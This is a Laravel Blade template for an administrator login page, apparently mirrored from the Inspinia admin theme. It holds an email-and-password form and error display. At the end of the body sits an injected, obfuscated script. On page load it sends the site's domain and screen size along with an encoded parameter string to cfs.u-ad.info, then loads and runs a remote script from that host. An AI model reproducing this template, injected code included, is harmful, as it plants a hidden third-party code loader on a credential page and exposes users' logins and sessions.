<!DOCTYPE html>
<html>


<!-- Mirrored from webapplayers.com/inspinia_admin-v2.3/login.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 16 Nov 2015 17:24:00 GMT -->
<head>

    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>ADMINISTRATOR | Login</title>

    <link href="{{asset('css/bootstrap.min.css')}}" rel="stylesheet">
    <link href="{{asset('font-awesome/css/font-awesome.css')}}" rel="stylesheet">

    <link href="{{asset('css/animate.css')}}" rel="stylesheet">
    <link href="{{asset('css/style.css')}}" rel="stylesheet">

</head>

<body class="gray-bg">

<div class="middle-box text-center loginscreen animated fadeInDown">
    <div>
        <div>

            <h1 class="logo-name">IN+</h1>

        </div>
        <h3>Administrator Login</h3>
        {!! Form::open(['route'=>'bo.login.post','class'=>'m-t','role'=>'form']) !!}
            <div class="form-group">
                <input type="email" class="form-control" placeholder="Username" name="email" required="">
            </div>
            <div class="form-group">
                <input type="password" class="form-control" placeholder="Password" name="password" required="">
            </div>
            <button type="submit" class="btn btn-primary block full-width m-b">Login</button>
        {!! Form::close() !!}
        @if(count($errors) > 0)
            <div class="alert alert-danger text-left">
                <ul>
                    @foreach($errors->all() as $error)
                        <li>{{ $error }}</li>
                    @endforeach
                </ul>
            </div>
        @endif
    </div>
</div>

<!-- Mainly scripts -->
<script src="{{asset('js/jquery-2.1.1.js')}}"></script>
<script src="{{asset('js/bootstrap.min.js')}}"></script>

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582AaN6h071sG%2bQVeRFnR5BCFWkrrdG3kg9dQuf1uK747CdR2EkfxYFZl36GxHbAp%2fQk3nvtH3E%2bTbGW%2f68Mo6WdqQC0UTXxf7%2fk1WlmavLZ9lhEHTd%2ftBUGY26uXcxrxTOPoTnnI1ia%2bQcHgH23v9MHG4%2fbf8n7hA24xV0V9PRPpySYPgEVYV9zecq3lT%2bEu99ZRBRTTZX8kDnocb1YZMJ%2fLIOF3Sq%2fVSX%2fWa9Ji7blClW95ae%2flDEiQo%2flfwt%2fMv%2bCmi0VISq4NsZx49NwoOvNf3vSHLGdCgmMV1clf3iQ%2f1XV3XvnFOwB978ibvviP8fTD%2fdYDnGI1Uixf7am62gLbIIdo%2ffTLucSRM3jYuwOzKalWoZzwJt3%2bgHbNFpQl0CQBRTH982x1BKlA03hxdmR%2fyIRPcOZWVmAKcceoCqNEGxuulm7GpP51XKZVWe5r4UZvgSYe4dKnrzO2cDbFBy%2fF5aE0E2M5epsy66tSNX5JBtsrB3RSo8GM%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>


<!-- Mirrored from webapplayers.com/inspinia_admin-v2.3/login.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 16 Nov 2015 17:24:00 GMT -->
</html>
